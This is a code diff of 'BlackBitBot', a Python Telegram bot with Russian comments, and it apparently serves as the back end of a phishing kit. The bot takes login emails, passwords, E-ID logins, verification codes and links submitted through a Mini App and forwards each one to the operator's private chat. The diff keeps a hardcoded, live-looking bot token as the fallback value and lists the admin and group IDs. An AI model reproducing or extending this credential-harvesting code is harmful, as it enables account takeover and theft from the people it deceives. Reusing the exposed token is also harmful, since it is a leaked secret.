@@ -8,7 +8,7 @@ from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ==================== КОНФИГ ====================
-BOT_TOKEN = "8483815029:AAFaiAI-0cSYEtQx_iTF2bdNOmtE5K45h1I"
+BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8483815029:AAFaiAI-0cSYEtQx_iTF2bdNOmtE5K45h1I")
 ADMIN_ID = 7502182022  # ← ТВОЙ ID
 GROUP_CHAT_ID = -1004301542136  # ← ID ГРУППЫ
 WEB_APP_URL = "https://d3987616-hue.github.io/blackbit/"
@@ -62,33 +62,32 @@ class BlackBitBot:
         user_id = msg.from_user.id
         text = msg.text
 
-        # Если сообщение из группы — игнорируем
         if chat_id == GROUP_CHAT_ID:
             return
 
-        # ---- Если пользователь вводит код ----
+        # ---- Код ----
         if user_sessions.get(user_id, {}).get('awaiting_code'):
             await self.app.bot.send_message(
-                ADMIN_ID,  # ← В ЛИЧКУ АДМИНУ
-                f"📧 КОД: `{text}`",
+                ADMIN_ID,
+                text=f"📧 КОД: `{text}`",
                 parse_mode="Markdown"
             )
             user_sessions[user_id]['awaiting_code'] = False
             await msg.reply_text("✅ Код отправлен администратору!")
             return
 
-        # ---- Если пользователь вводит ссылку ----
+        # ---- Ссылка ----
         if user_sessions.get(user_id, {}).get('awaiting_link'):
             await self.app.bot.send_message(
-                ADMIN_ID,  # ← В ЛИЧКУ АДМИНУ
-                f"🔗 ССЫЛКА: `{text}`",
+                ADMIN_ID,
+                text=f"🔗 ССЫЛКА: `{text}`",
                 parse_mode="Markdown"
             )
             user_sessions[user_id]['awaiting_link'] = False
             await msg.reply_text("✅ Ссылка отправлена администратору!")
             return
 
-        # ---- Если это JSON от Mini App ----
+        # ---- JSON от Mini App ----
         if text.startswith('{') and text.endswith('}'):
             try:
                 data = json.loads(text)
@@ -101,7 +100,7 @@ class BlackBitBot:
                 # ---- Обычный вход ----
                 if email and password and not code and not link and not eid_type:
                     await self.app.bot.send_message(
-                        ADMIN_ID,  # ← В ЛИЧКУ АДМИНУ
+                        ADMIN_ID,
                         text=f"🔔 НОВАЯ ЗАЯВКА!\n\n"
                              f"👤 ID: `{user_id}`\n"
                              f"📧 Логин: `{email}`\n"
@@ -114,7 +113,7 @@ class BlackBitBot:
                 # ---- E-ID вход ----
                 if eid_type == 'eid_login' and email and password:
                     await self.app.bot.send_message(
-                        ADMIN_ID,  # ← В ЛИЧКУ АДМИНУ
+                        ADMIN_ID,
                         text=f"🆔 E-ID ВХОД\n\n"
                              f"👤 ID: `{user_id}`\n"
                              f"📧 Логин: `{email}`\n"
@@ -127,7 +126,7 @@ class BlackBitBot:
                 # ---- Код ----
                 if code:
                     await self.app.bot.send_message(
-                        ADMIN_ID,  # ← В ЛИЧКУ АДМИНУ
+                        ADMIN_ID,
                         text=f"📧 КОД: `{code}`",
                         parse_mode="Markdown"
                     )
@@ -137,7 +136,7 @@ class BlackBitBot:
                 # ---- Ссылка ----
                 if link:
                     await self.app.bot.send_message(
-                        ADMIN_ID,  # ← В ЛИЧКУ АДМИНУ
+                        ADMIN_ID,
                         text=f"🔗 ССЫЛКА: `{link}`",
                         parse_mode="Markdown"
                     )
@@ -148,7 +147,6 @@ class BlackBitBot:
                 logger.error(f"Ошибка: {e}")
                 await msg.reply_text("❌ Ошибка обработки данных")
 
-        # ---- Если пользователь просто пишет текст ----
         else:
             await msg.reply_text("ℹ️ Используйте кнопку «Войти»")
 
